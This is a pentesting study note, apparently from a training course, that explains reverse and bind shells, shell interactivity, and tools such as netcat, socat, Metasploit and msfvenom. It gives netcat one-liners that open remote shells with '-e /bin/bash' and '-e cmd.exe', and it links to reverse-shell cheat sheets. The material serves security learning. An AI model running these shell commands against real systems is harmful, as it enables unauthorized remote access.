## What is a shell?
- In the simplest possible terms, shells are what we use when interfacing with a Command Line environment (CLI).
- In other words, the common bash or sh programs in Linux are examples of shells.

**reverse shell** -
- Reverse shells are when the target is forced to execute code that connects _back_ to your computer.
- Reverse shells are a good way to bypass firewall rules that may prevent you from connecting to arbitrary ports on the target; however, the drawback is that, when receiving a shell from a machine across the internet, you would need to configure your own network to accept the shell.

**Example** - 
- On the left we have a reverse shell listener -- this is what receives the connection.
- On the right is a simulation of sending a reverse shell.

On the attacking machine:
`sudo nc -lvnp 443`

On the target:
`nc <LOCAL-IP> <PORT> -e /bin/bash`
![[shells1.png]]
- Notice that after running the command on the right, the listener receives a connection.
- The important thing here is that we are _listening_ on our own attacking machine, and sending a connection _from_ the target.

**bind shell** - 
- Bind shells are when the code executed on the target is used to start a listener attached to a shell directly on the target.
- This would then be opened up to the internet, meaning you can connect to the port that the code has opened and obtain remote code execution that way.
- This has the advantage of not requiring any configuration on your own network, but may be prevented by firewalls protecting the target.

**Example** - 
- on the left we have the attacker's computer, on the right we have a simulated target.
- First, we start a listener on the target -- this time we're also telling it to execute `cmd.exe`. Then, with the listener up and running, we connect from our own machine to the newly opened port.
On the target:
`nc -lvnp <port> -e "cmd.exe"`  

On the attacking machine:
`nc MACHINE_IP <port>`
![[shells2.png]]
The important thing to understand here is that we are _listening_ on the target, then connecting to it with our own machine.

### interactivity
1. **Interactive:**
	- If you've used Powershell, Bash, Zsh, sh, or any other standard CLI environment then you will be used to interactive shells.
	- These allow you to interact with programs after executing them.
**Example** - 
SSH login prompt:
![[shells3.png]]
- Here you can see that it's asking _interactively_ that the user type either yes or no in order to continue the connection.
- This is an interactive program, which requires an interactive shell in order to run.

2. **Non-Interactive:**
	- _Non-Interactive_ shells don't give you that luxury.
	- In a non-interactive shell you are limited to using programs which do not require user interaction in order to run properly.
	- Unfortunately, the majority of simple reverse and bind shells are non-interactive, which can make further exploitation trickier.
	- what happens when we try to run SSH in a non-interactive shell:
![[shells4.png]]
Notice that the `whoami` command (which is non-interactive) executes perfectly, but the `ssh` command (which _is_ interactive) gives us no output at all.
**Note** - 
1. interactive programs do not work in non-interactive shells.
2. `listener` is an alias of `sudo rlwrap nc -lvnp 443`

## Tools
1. **Netcat:**
	- It is used to manually perform all kinds of network interactions, including things like banner grabbing during enumeration, it can also be used to receive reverse shells and connect to remote ports on a target system.
	- Netcat shells are very unstable (easy to lose) by default, but can be improved by techniques.

2. **Socat:**
	- It can do all of the same things, and _many_ more. Socat shells are usually more stable than netcat shells.
	- however, there are two big catches:
		1. The syntax is more difficult
		2. Netcat is installed on virtually every Linux distribution by default. Socat is very rarely installed by default.

3. **Metasploit -- multi/handler:**
	- The `exploit/multi/handler` module of the Metasploit framework is, like socat and netcat, used to receive reverse shells.
	- t's also the only way to interact with a _meterpreter_ shell, and is the easiest way to handle _staged_ payloads.

4. **Msfvenom:**
	- msfvenom can generate payloads other than reverse and bind shells.
	- Some repositories of shells are [Payloads all the Things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md).The PentestMonkey [Reverse Shell Cheatsheet](https://web.archive.org/web/20200901140719/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) is also commonly used.
	- webshells located at `/usr/share/webshells` in kali linux.